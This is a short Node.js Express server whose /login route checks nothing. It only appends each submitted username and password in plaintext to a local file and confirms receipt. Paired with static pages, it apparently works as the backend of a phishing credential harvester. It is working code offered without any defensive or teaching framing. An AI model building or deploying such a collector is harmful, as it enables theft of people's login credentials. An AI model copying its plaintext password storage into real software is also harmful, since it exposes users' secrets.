const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const PORT = 3000;

// Middleware to parse incoming form data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve static files (like HTML, CSS, and JS)
app.use(express.static('public'));

// Route to handle the login form submission
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    // Save login data to a file
    const loginInfo = `Username: ${username}, Password: ${password}\n`;
    fs.appendFile('loginData.txt', loginInfo, (err) => {
        if (err) {
            console.log(err);
            return res.status(500).send('Error saving login info');
        }
        console.log('Login info saved');
        res.send('Login info received');
    });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
